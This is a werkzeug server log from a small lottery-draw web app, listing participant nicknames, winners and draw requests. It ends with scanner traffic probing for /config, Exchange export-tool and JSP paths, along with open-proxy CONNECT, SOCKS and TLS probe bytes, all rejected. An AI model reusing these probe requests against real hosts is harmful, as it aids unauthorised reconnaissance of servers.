+INFO:main:参与名单： ['X是西瓜', '土拨鼠糖浆', '睡不醒和不高兴的', '写作马鹿读作竹', '_大拙无锋', '奶冻啵啵-', '灰色犀牛x0x', '起床困难户xuxu', '抹茶生巧z_', '凉拌香菜L', '-苹菓绒-', '_MXKD', '球球6565', 'Stardust_Sparklingwine', '零儿点七吨', 'KillMeAndCutOutMyHeart', 'LAURAWINGO_', '芋泥鸭心-丰隆梦女版', 'glo_9919', '慕縉', '你该好好过活', '-1min-', '扯点儿经', '过摇滚的夏', '穆瑪MiKi', 'yiyiyiyiyiyiyi-', '萧萧猫', '软fufu糯米团子', '柚柚菲菲', '微醺的西兰花', 'Hhhyowu', '心心念念的筒骨粉', '红莓黑加仑O126_', 'TannKiyoxx-', '喜欢喝藿香的夜猫儿', '不爱喝水·', '賀菡菡_hh']
+INFO:main:中奖者：抹茶生巧z_
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 20:14:22] "POST /api/draw HTTP/1.0" 200 -
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 20:14:22] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['X是西瓜', '土拨鼠糖浆', '睡不醒和不高兴的', '写作马鹿读作竹', '_大拙无锋', '奶冻啵啵-', '灰色犀牛x0x', '起床困难户xuxu', '抹茶生巧z_', '凉拌香菜L', '-苹菓绒-', '_MXKD', '球球6565', 'Stardust_Sparklingwine', '零儿点七吨', 'KillMeAndCutOutMyHeart', 'LAURAWINGO_', '芋泥鸭心-丰隆梦女版', 'glo_9919', '慕縉', '你该好好过活', '-1min-', '扯点儿经', '过摇滚的夏', '穆瑪MiKi', 'yiyiyiyiyiyiyi-', '萧萧猫', '软fufu糯米团子', '柚柚菲菲', '微醺的西兰花', 'Hhhyowu', '心心念念的筒骨粉', '红莓黑加仑O126_', 'TannKiyoxx-', '喜欢喝藿香的夜猫儿', '不爱喝水·', '賀菡菡_hh']
+INFO:main:中奖者：你该好好过活, 球球6565, 零儿点七吨
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 20:15:05] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['X是西瓜', '土拨鼠糖浆', '睡不醒和不高兴的', '写作马鹿读作竹', '_大拙无锋', '奶冻啵啵-', '灰色犀牛x0x', '起床困难户xuxu', '抹茶生巧z_', '凉拌香菜L', '-苹菓绒-', '_MXKD', '球球6565', 'Stardust_Sparklingwine', '零儿点七吨', 'KillMeAndCutOutMyHeart', 'LAURAWINGO_', '芋泥鸭心-丰隆梦女版', 'glo_9919', '慕縉', '你该好好过活', '-1min-', '扯点儿经', '过摇滚的夏', '穆瑪MiKi', 'yiyiyiyiyiyiyi-', '萧萧猫', '软fufu糯米团子', '柚柚菲菲', '微醺的西兰花', 'Hhhyowu', '心心念念的筒骨粉', '红莓黑加仑O126_', 'TannKiyoxx-', '喜欢喝藿香的夜猫儿', '不爱喝水·', '賀菡菡_hh']
+INFO:main:中奖者：萧萧猫, 零儿点七吨, 奶冻啵啵-
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 20:17:25] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['X是西瓜', '土拨鼠糖浆', '睡不醒和不高兴的', '写作马鹿读作竹', '_大拙无锋', '奶冻啵啵-', '灰色犀牛x0x', '起床困难户xuxu', '抹茶生巧z_', '凉拌香菜L', '-苹菓绒-', '_MXKD', '球球6565', 'Stardust_Sparklingwine', '零儿点七吨', 'KillMeAndCutOutMyHeart', 'LAURAWINGO_', '芋泥鸭心-丰隆梦女版', 'glo_9919', '慕縉', '你该好好过活', '-1min-', '扯点儿经', '过摇滚的夏', '穆瑪MiKi', 'yiyiyiyiyiyiyi-', '萧萧猫', '软fufu糯米团子', '柚柚菲菲', '微醺的西兰花', 'Hhhyowu', '心心念念的筒骨粉', '红莓黑加仑O126_', 'TannKiyoxx-', '喜欢喝藿香的夜猫儿', '不爱喝水·', '賀菡菡_hh']
+INFO:main:中奖者：你该好好过活, 喜欢喝藿香的夜猫儿, 賀菡菡_hh
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 20:19:03] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['云与月与云_']
+INFO:main:中奖者：云与月与云_
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 20:19:16] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['试一下又怎样', '极韵君', '暴富的锦鲤吖', 'A_tinder一粒火', '草本荔枝薄荷味', '只想发财和粗去玩', '拿起笔写数据流图', 'Reginasally', 'jsdhwdmaX0420', '_kiwi華_', '飞鸟行令', '酷拉皮卡我老婆', 'Twle_', 'Kuri_久里', '京城小红莲', '闫雪Yy_', '夏酒酿', '形而上学cp本质论', '三分钟调理不良', '不愿放弃二次元的甪', '芋圆一份', 'SweetBlood甜血', '乘风飞不起的枣', '桃桃糖8', 'sayumi尹懿', '伐伐伐暮工', '猫猫奈特', '四季春加点叶', '_犿卜三三', '笑面公卿阿澈', '朕就是如此青春的美boy', '纯情农户', '艾斯塔西亚_Estasia', '来一斤小面包_', 'Nicecoffee61183', 'W桑是羊驼', '没办法修改昵称啦', '吃米饼的企鹅宝uwu', '行走中的九', '放牛云中', '大橙子阿光', '种花家的小桃桃', '长岸为蝉鸣加粟', '嘿凤梨酥酥酥', '十五度同类', '神说要有光crystal', '古鲁夏', '今天和漂亮小姐姐偶遇了吗', '近水客', '苏淳颜', '云辰__blue', '赛博咸鱼罐头贩卖机', '曦尘JC', '安睡在贝壳小屋', '白越今天也要记得好好刷牙', 'IoO0IOops', 'bq每天在哭泣', '夜雨4空阶', '是酒弥子呀_ing', 'AlinnDairy', '吉尔威', '非碌_新', '戟阙是只龙', 'SherbetWhite', '奶油煎蛋黄番茄汤', '多说无益会自闭', '还请不要离开爱的陷阱', '什么时候让我欧一次', '如果我们迷失了', '自转圆', '雪某想做绘画大佬', '土豆丝TvT', 'RSG银月', '喝一碗烫水', '生命垂位', 'sjgdqs', '热带雨咖雨带热', 'Mea的教育']
+INFO:main:中奖者：朕就是如此青春的美boy
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 21:00:56] "POST /api/draw HTTP/1.0" 200 -
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 21:00:57] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['没办法修改昵称啦', '夜雨4空阶', '吃米饼的企鹅宝uwu', '行走中的九', 'sayumi尹懿', '极韵君', '暴富的锦鲤吖', '种花家的小桃桃', 'AlinnDairy', 'A_tinder一粒火', '长岸为蝉鸣加粟', '吉尔威', '戟阙是只龙', 'SherbetWhite', '四季春加点叶', 'Reginasally', 'jsdhwdmaX0420', '_犿卜三三', '奶油煎蛋黄番茄汤', '多说无益会自闭', '朕就是如此青春的美boy', '纯情农户', '还请不要离开爱的陷阱', '_kiwi華_', '来一斤小面包_', 'Nicecoffee61183', '如果我们迷失了', '苏淳颜', '自转圆', 'Kuri_久里', '赛博咸鱼罐头贩卖机', '喝一碗烫水', '安睡在贝壳小屋', '不愿放弃二次元的甪', 'sjgdqs', '热带雨咖雨带热', '白越今天也要记得好好刷牙', 'IoO0IOops', 'SweetBlood甜血']
+INFO:main:中奖者：SweetBlood甜血, 赛博咸鱼罐头贩卖机
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 21:03:19] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['没办法修改昵称啦', '夜雨4空阶', '吃米饼的企鹅宝uwu', '行走中的九', 'sayumi尹懿', '极韵君', '暴富的锦鲤吖', '种花家的小桃桃', 'AlinnDairy', 'A_tinder一粒火', '长岸为蝉鸣加粟', '吉尔威', '戟阙是只龙', 'SherbetWhite', '四季春加点叶', 'Reginasally', 'jsdhwdmaX0420', '_犿卜三三', '奶油煎蛋黄番茄汤', '多说无益会自闭', '朕就是如此青春的美boy', '纯情农户', '还请不要离开爱的陷阱', '_kiwi華_', '来一斤小面包_', 'Nicecoffee61183', '如果我们迷失了', '苏淳颜', '自转圆', 'Kuri_久里', '赛博咸鱼罐头贩卖机', '喝一碗烫水', '安睡在贝壳小屋', '不愿放弃二次元的甪', 'sjgdqs', '热带雨咖雨带热', '白越今天也要记得好好刷牙', 'IoO0IOops', 'SweetBlood甜血']
+INFO:main:中奖者：纯情农户, IoO0IOops
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 21:05:41] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['没办法修改昵称啦', '夜雨4空阶', '吃米饼的企鹅宝uwu', '行走中的九', 'sayumi尹懿', '极韵君', '暴富的锦鲤吖', '种花家的小桃桃', 'AlinnDairy', 'A_tinder一粒火', '长岸为蝉鸣加粟', '吉尔威', '戟阙是只龙', 'SherbetWhite', '四季春加点叶', 'Reginasally', 'jsdhwdmaX0420', '_犿卜三三', '奶油煎蛋黄番茄汤', '多说无益会自闭', '朕就是如此青春的美boy', '纯情农户', '还请不要离开爱的陷阱', '_kiwi華_', '来一斤小面包_', 'Nicecoffee61183', '如果我们迷失了', '苏淳颜', '自转圆', 'Kuri_久里', '赛博咸鱼罐头贩卖机', '喝一碗烫水', '安睡在贝壳小屋', '不愿放弃二次元的甪', 'sjgdqs', '热带雨咖雨带热', '白越今天也要记得好好刷牙', 'IoO0IOops', 'SweetBlood甜血']
+INFO:main:中奖者：_犿卜三三, 吃米饼的企鹅宝uwu
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 21:06:48] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['没办法修改昵称啦', '试一下又怎样', '夜雨4空阶', '吃米饼的企鹅宝uwu', '桃桃糖8', '行走中的九', 'sayumi尹懿', '极韵君', '暴富的锦鲤吖', '种花家的小桃桃', 'AlinnDairy', 'A_tinder一粒火', '长岸为蝉鸣加粟', '伐伐伐暮工', '吉尔威', '戟阙是只龙', 'SherbetWhite', '猫猫奈特', '只想发财和粗去玩', '嘿凤梨酥酥酥', '拿起笔写数据流图', '四季春加点叶', '神说要有光crystal', 'Reginasally', 'jsdhwdmaX0420', '_犿卜三三', '奶油煎蛋黄番茄汤', '多说无益会自闭', '古鲁夏', '朕就是如此青春的美boy', '纯情农户', '还请不要离开爱的陷阱', '_kiwi華_', '什么时候让我欧一次', '飞鸟行令', '来一斤小面包_', '酷拉皮卡我老婆', 'Twle_', 'Nicecoffee61183', '如果我们迷失了', '苏淳颜', '自转圆', 'Kuri_久里', '雪某想做绘画大佬', '京城小红莲', '赛博咸鱼罐头贩卖机', '喝一碗烫水', '夏酒酿', '形而上学cp本质论', '安睡在贝壳小屋', '不愿放弃二次元的甪', '三分钟调理不良', 'sjgdqs', '热带雨咖雨带热', '白越今天也要记得好好刷牙', 'Mea的教育', 'IoO0IOops', 'SweetBlood甜血']
+INFO:main:中奖者：朕就是如此青春的美boy, 酷拉皮卡我老婆
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 21:08:44] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:循环执行超时，退出循环2。
+INFO:main:参与名单： ['试一下又怎样', '极韵君', '暴富的锦鲤吖', 'A_tinder一粒火', '草本荔枝薄荷味', '只想发财和粗去玩', '拿起笔写数据流图', 'Reginasally', 'jsdhwdmaX0420', '椋椋在摆烂', '是谁最后一天抽饮月光锥没歪啊', '_kiwi華_', 'STARRY星辉映川', 'wiromi', '飞鸟行令', '酷拉皮卡我老婆', 'Twle_', 'Kuri_久里', '京城小红莲', '闫雪Yy_', '夏酒酿', '形而上学cp本质论', '三分钟调理不良', '不愿放弃二次元的甪', '芋圆一份', 'thisisZeRoOne', '听说名字叫锦鲤就能成为锦鲤', '微桓以卿', 'SweetBlood甜血', '乘风飞不起的枣', '桃桃糖8', 'sayumi尹懿', '白鸟自修纸盒', '伐伐伐暮工', '猫猫奈特', '子衿逃到深山里', '四季春加点叶', '_犿卜三三', '笑面公卿阿澈', '朕就是如此青春的美boy', '纯情农户', '艾斯塔西亚_Estasia', '来一斤小面包_', '阿艹寇', 'Nicecoffee61183', '用户6302853171', 'W桑是羊驼', '没办法修改昵称啦', '吃米饼的企鹅宝uwu', '行走中的九', '放牛云中', '大橙子阿光', '种花家的小桃桃', '长岸为蝉鸣加粟', '嘿凤梨酥酥酥', '十五度同类', '神说要有光crystal', '每天早8饿的想鼠', '古鲁夏', '今天和漂亮小姐姐偶遇了吗', 'lulu来了_', '近水客', '洒一缕星光', '苏淳颜', '云辰__blue', '赛博咸鱼罐头贩卖机', '曦尘JC', '安睡在贝壳小屋', '白越今天也要记得好好刷牙', 'IoO0IOops', 'bq每天在哭泣', '夜雨4空阶', '是酒弥子呀_ing', 'AlinnDairy', '几锣草莓塔_', '吉尔威', '非碌_新', '戟阙是只龙', 'SherbetWhite', '叁十二二二', '相遇之后我们再去流浪', '奶油煎蛋黄番茄汤', '多说无益会自闭', '还请不要离开爱的陷阱', '哥们儿我天语断了', '什么时候让我欧一次', '阳光开朗大MALO', '神兽金刚X', '如果我们迷失了', '自转圆', '雪某想做绘画大佬', '土豆丝TvT', 'RSG银月', '喝一碗烫水', '生命垂位', 'sjgdqs', '热带雨咖雨带热', 'Mea的教育']
+INFO:main:中奖者：芋圆一份, Nicecoffee61183
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 21:11:42] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['没办法修改昵称啦', '夜雨4空阶', '吃米饼的企鹅宝uwu', '行走中的九', 'sayumi尹懿', '极韵君', '暴富的锦鲤吖', '种花家的小桃桃', 'AlinnDairy', 'A_tinder一粒火', '长岸为蝉鸣加粟', '吉尔威', '戟阙是只龙', 'SherbetWhite', '四季春加点叶', 'Reginasally', 'jsdhwdmaX0420', '_犿卜三三', '奶油煎蛋黄番茄汤', '多说无益会自闭', '朕就是如此青春的美boy', '纯情农户', '还请不要离开爱的陷阱', '_kiwi華_', '来一斤小面包_', 'Nicecoffee61183', '如果我们迷失了', '苏淳颜', '自转圆', 'Kuri_久里', '赛博咸鱼罐头贩卖机', '喝一碗烫水', '安睡在贝壳小屋', '不愿放弃二次元的甪', 'sjgdqs', '热带雨咖雨带热', '白越今天也要记得好好刷牙', 'IoO0IOops', 'SweetBlood甜血']
+INFO:main:中奖者：暴富的锦鲤吖, 戟阙是只龙
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 21:14:02] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['没办法修改昵称啦', '试一下又怎样', '夜雨4空阶', '吃米饼的企鹅宝uwu', '桃桃糖8', '行走中的九', 'sayumi尹懿', '极韵君', '暴富的锦鲤吖', '种花家的小桃桃', 'AlinnDairy', 'A_tinder一粒火', '长岸为蝉鸣加粟', '伐伐伐暮工', '吉尔威', '戟阙是只龙', 'SherbetWhite', '猫猫奈特', '只想发财和粗去玩', '嘿凤梨酥酥酥', '拿起笔写数据流图', '四季春加点叶', '神说要有光crystal', 'Reginasally', 'jsdhwdmaX0420', '_犿卜三三', '奶油煎蛋黄番茄汤', '多说无益会自闭', '古鲁夏', '朕就是如此青春的美boy', '纯情农户', '还请不要离开爱的陷阱', '_kiwi華_', '什么时候让我欧一次', '飞鸟行令', '来一斤小面包_', '酷拉皮卡我老婆', 'Twle_', 'Nicecoffee61183', '如果我们迷失了', '苏淳颜', '自转圆', 'Kuri_久里', '雪某想做绘画大佬', '京城小红莲', '赛博咸鱼罐头贩卖机', '喝一碗烫水', '夏酒酿', '形而上学cp本质论', '安睡在贝壳小屋', '不愿放弃二次元的甪', '三分钟调理不良', 'sjgdqs', '热带雨咖雨带热', '白越今天也要记得好好刷牙', 'Mea的教育', 'IoO0IOops', 'SweetBlood甜血']
+INFO:main:中奖者：暴富的锦鲤吖, 种花家的小桃桃
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 21:18:27] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:循环执行超时，退出循环2。
+INFO:main:参与名单： ['试一下又怎样', '极韵君', '暴富的锦鲤吖', 'A_tinder一粒火', '草本荔枝薄荷味', '只想发财和粗去玩', '拿起笔写数据流图', 'Reginasally', 'jsdhwdmaX0420', '椋椋在摆烂', '是谁最后一天抽饮月光锥没歪啊', '_kiwi華_', 'STARRY星辉映川', 'wiromi', '飞鸟行令', '酷拉皮卡我老婆', 'Twle_', 'Kuri_久里', '京城小红莲', '闫雪Yy_', '夏酒酿', '形而上学cp本质论', '三分钟调理不良', '不愿放弃二次元的甪', '芋圆一份', 'thisisZeRoOne', '听说名字叫锦鲤就能成为锦鲤', '微桓以卿', 'SweetBlood甜血', '乘风飞不起的枣', '桃桃糖8', 'sayumi尹懿', '白鸟自修纸盒', '伐伐伐暮工', '猫猫奈特', '子衿逃到深山里', '四季春加点叶', '_犿卜三三', '笑面公卿阿澈', '朕就是如此青春的美boy', '纯情农户', '艾斯塔西亚_Estasia', '来一斤小面包_', '阿艹寇', 'Nicecoffee61183', '用户6302853171', 'W桑是羊驼', '没办法修改昵称啦', '吃米饼的企鹅宝uwu', '行走中的九', '放牛云中', '大橙子阿光', '种花家的小桃桃', '长岸为蝉鸣加粟', '嘿凤梨酥酥酥', '十五度同类', '神说要有光crystal', '每天早8饿的想鼠', '古鲁夏', '今天和漂亮小姐姐偶遇了吗', 'lulu来了_', '近水客', '洒一缕星光', '苏淳颜', '云辰__blue', '赛博咸鱼罐头贩卖机', '曦尘JC', '安睡在贝壳小屋', '白越今天也要记得好好刷牙', 'IoO0IOops', 'bq每天在哭泣', '夜雨4空阶', '是酒弥子呀_ing', 'AlinnDairy', '几锣草莓塔_', '吉尔威', '非碌_新', '戟阙是只龙', 'SherbetWhite', '叁十二二二', '相遇之后我们再去流浪', '奶油煎蛋黄番茄汤', '多说无益会自闭', '还请不要离开爱的陷阱', '哥们儿我天语断了', '什么时候让我欧一次', '阳光开朗大MALO', '神兽金刚X', '如果我们迷失了', '自转圆', '雪某想做绘画大佬', '土豆丝TvT', 'RSG银月', '喝一碗烫水', '生命垂位', 'sjgdqs', '热带雨咖雨带热', 'Mea的教育']
+INFO:main:中奖者：每天早8饿的想鼠
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 21:21:18] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['试一下又怎样', '极韵君', '暴富的锦鲤吖', 'A_tinder一粒火', '草本荔枝薄荷味', '只想发财和粗去玩', '拿起笔写数据流图', 'Reginasally', 'jsdhwdmaX0420', '_kiwi華_', '飞鸟行令', '酷拉皮卡我老婆', 'Twle_', 'Kuri_久里', '京城小红莲', '闫雪Yy_', '夏酒酿', '形而上学cp本质论', '三分钟调理不良', '不愿放弃二次元的甪', '芋圆一份', 'SweetBlood甜血', '乘风飞不起的枣', '桃桃糖8', 'sayumi尹懿', '伐伐伐暮工', '猫猫奈特', '四季春加点叶', '_犿卜三三', '笑面公卿阿澈', '朕就是如此青春的美boy', '纯情农户', '艾斯塔西亚_Estasia', '来一斤小面包_', 'Nicecoffee61183', 'W桑是羊驼', '没办法修改昵称啦', '吃米饼的企鹅宝uwu', '行走中的九', '放牛云中', '大橙子阿光', '种花家的小桃桃', '长岸为蝉鸣加粟', '嘿凤梨酥酥酥', '十五度同类', '神说要有光crystal', '古鲁夏', '今天和漂亮小姐姐偶遇了吗', '近水客', '苏淳颜', '云辰__blue', '赛博咸鱼罐头贩卖机', '曦尘JC', '安睡在贝壳小屋', '白越今天也要记得好好刷牙', 'IoO0IOops', 'bq每天在哭泣', '夜雨4空阶', '是酒弥子呀_ing', 'AlinnDairy', '吉尔威', '非碌_新', '戟阙是只龙', 'SherbetWhite', '奶油煎蛋黄番茄汤', '多说无益会自闭', '还请不要离开爱的陷阱', '什么时候让我欧一次', '如果我们迷失了', '自转圆', '雪某想做绘画大佬', '土豆丝TvT', 'RSG银月', '喝一碗烫水', '生命垂位', 'sjgdqs', '热带雨咖雨带热', 'Mea的教育']
+INFO:main:中奖者：自转圆
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 21:29:20] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:循环执行超时，退出循环2。
+INFO:main:参与名单： ['试一下又怎样', '极韵君', '暴富的锦鲤吖', 'A_tinder一粒火', '草本荔枝薄荷味', '只想发财和粗去玩', '拿起笔写数据流图', 'Reginasally', 'jsdhwdmaX0420', '椋椋在摆烂', '是谁最后一天抽饮月光锥没歪啊', '_kiwi華_', 'STARRY星辉映川', 'wiromi', '飞鸟行令', '酷拉皮卡我老婆', 'Twle_', 'Kuri_久里', '京城小红莲', '闫雪Yy_', '夏酒酿', '形而上学cp本质论', '三分钟调理不良', '不愿放弃二次元的甪', '芋圆一份', 'thisisZeRoOne', '听说名字叫锦鲤就能成为锦鲤', '微桓以卿', 'SweetBlood甜血', '乘风飞不起的枣', '桃桃糖8', 'sayumi尹懿', '白鸟自修纸盒', '伐伐伐暮工', '猫猫奈特', '子衿逃到深山里', '四季春加点叶', '_犿卜三三', '笑面公卿阿澈', '朕就是如此青春的美boy', '纯情农户', '艾斯塔西亚_Estasia', '来一斤小面包_', '阿艹寇', 'Nicecoffee61183', '用户6302853171', 'W桑是羊驼', '没办法修改昵称啦', '吃米饼的企鹅宝uwu', '行走中的九', '放牛云中', '大橙子阿光', '种花家的小桃桃', '长岸为蝉鸣加粟', '嘿凤梨酥酥酥', '十五度同类', '神说要有光crystal', '每天早8饿的想鼠', '古鲁夏', '今天和漂亮小姐姐偶遇了吗', 'lulu来了_', '近水客', '洒一缕星光', '苏淳颜', '云辰__blue', '赛博咸鱼罐头贩卖机', '曦尘JC', '安睡在贝壳小屋', '白越今天也要记得好好刷牙', 'IoO0IOops', 'bq每天在哭泣', '夜雨4空阶', '是酒弥子呀_ing', 'AlinnDairy', '几锣草莓塔_', '吉尔威', '非碌_新', '戟阙是只龙', 'SherbetWhite', '叁十二二二', '相遇之后我们再去流浪', '奶油煎蛋黄番茄汤', '多说无益会自闭', '还请不要离开爱的陷阱', '哥们儿我天语断了', '什么时候让我欧一次', '阳光开朗大MALO', '神兽金刚X', '如果我们迷失了', '自转圆', '雪某想做绘画大佬', '土豆丝TvT', 'RSG银月', '喝一碗烫水', '生命垂位', 'sjgdqs', '热带雨咖雨带热', 'Mea的教育']
+INFO:main:中奖者：笑面公卿阿澈
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 21:29:52] "POST /api/draw HTTP/1.0" 200 -
+INFO:werkzeug:87.236.176.128 - - [17/Jul/2024 22:35:04] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:95.214.27.7 - - [18/Jul/2024 00:02:32] "[33mGET /config HTTP/1.1[0m" 404 -
+INFO:werkzeug:95.214.27.7 - - [18/Jul/2024 00:17:04] "[33mGET /config HTTP/1.1[0m" 404 -
+ERROR:werkzeug:48.216.197.65 - - [18/Jul/2024 00:45:22] code 400, message Bad request syntax ('MGLNDD_20.163.199.189_8081')
+INFO:werkzeug:48.216.197.65 - - [18/Jul/2024 00:45:22] "[35m[1mMGLNDD_20.163.199.189_8081[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:167.94.146.60 - - [18/Jul/2024 02:04:08] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:167.94.146.60 - - [18/Jul/2024 02:04:11] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:167.94.146.60 - - [18/Jul/2024 02:04:11] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:167.94.146.60 - - [18/Jul/2024 02:04:11] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+INFO:werkzeug:83.97.73.245 - - [18/Jul/2024 03:13:42] "[33mGET /jars HTTP/1.1[0m" 404 -
+INFO:werkzeug:80.75.212.75 - - [18/Jul/2024 03:24:10] "[33mCONNECT www.google.com:443 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:80.75.212.75 - - [18/Jul/2024 03:28:50] code 400, message Bad request syntax ("\x04\x01\x01»\x8eû'd\x00")
+INFO:werkzeug:80.75.212.75 - - [18/Jul/2024 03:28:50] "[35m[1m\x04\x01\x01»\x8eû'd\x00[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:80.75.212.75 - - [18/Jul/2024 03:28:53] code 400, message Bad request syntax ('\x05\x01\x00')
+INFO:werkzeug:80.75.212.75 - - [18/Jul/2024 03:28:53] "[35m[1m\x05\x01\x00[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:198.235.24.148 - - [18/Jul/2024 04:55:07] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:198.235.24.148 - - [18/Jul/2024 04:55:07] "[35m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Ç¡:ür\x02:ÕüÂø\x99.V\x92¥Ìr\x9e\x9egF5\x9cÊN\x97vVüÞó Ø¾\x1e1\x07Ó\x9dÿ2ÌåíÁ×F/Óy'ÊÒD¢Þamó±Ç\x8a/'\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:198.235.24.148 - - [18/Jul/2024 04:55:07] code 400, message Bad request version ('À(À$À\x14À')
+INFO:werkzeug:198.235.24.148 - - [18/Jul/2024 04:55:07] "[35m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x07?¹Åg &\x9eâ,ð\x17±d­¦:4\x89rÃÊaesqþ­Jv¦\x87\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:118.123.105.93 - - [18/Jul/2024 06:39:42] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:118.123.105.93 - - [18/Jul/2024 06:39:43] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:118.123.105.93 - - [18/Jul/2024 06:39:43] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:118.123.105.93 - - [18/Jul/2024 06:39:44] "[33mGET /.well-known/security.txt HTTP/1.1[0m" 404 -
+INFO:werkzeug:205.210.31.132 - - [18/Jul/2024 06:40:44] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.235.24.28 - - [18/Jul/2024 07:32:17] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:199.45.155.95 - - [18/Jul/2024 07:59:33] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:199.45.155.95 - - [18/Jul/2024 07:59:37] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:199.45.155.95 - - [18/Jul/2024 07:59:37] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:199.45.155.95 - - [18/Jul/2024 07:59:37] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+ERROR:werkzeug:103.45.246.23 - - [18/Jul/2024 09:36:28] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:103.45.246.23 - - [18/Jul/2024 09:36:28] "[35m[1m\x16\x03\x01\x00u\x01\x00\x00q\x03\x03þß-\x8e\x85\x04\x90]R\x14ã\x06ðÀ;R¶él@­íö4ñÈhz"\x8f±A\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:172.206.216.67 - - [18/Jul/2024 10:28:49] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:172.206.216.67 - - [18/Jul/2024 10:32:31] "[33mGET /swagger HTTP/1.1[0m" 404 -
+INFO:werkzeug:172.206.216.67 - - [18/Jul/2024 10:32:31] "[33mGET /master.jsp HTTP/1.1[0m" 404 -
+INFO:werkzeug:172.206.216.67 - - [18/Jul/2024 10:32:32] "[33mGET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1[0m" 404 -
+INFO:werkzeug:172.206.216.67 - - [18/Jul/2024 10:33:07] "[33mGET /tasktracker.jsp HTTP/1.1[0m" 404 -
+INFO:werkzeug:65.49.1.30 - - [18/Jul/2024 10:34:40] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:65.49.1.26 - - [18/Jul/2024 10:34:55] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:65.49.1.28 - - [18/Jul/2024 10:35:04] "[33mGET http://api.ipify.org/?format=json HTTP/1.1[0m" 404 -
+INFO:werkzeug:65.49.1.26 - - [18/Jul/2024 10:35:11] "[33mCONNECT www.shadowserver.org:443 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:198.235.24.128 - - [18/Jul/2024 11:19:54] code 400, message Bad request syntax ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03>ÿ«')
+INFO:werkzeug:198.235.24.128 - - [18/Jul/2024 11:19:54] "[35m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03>ÿ«[0m" HTTPStatus.BAD_REQUEST -
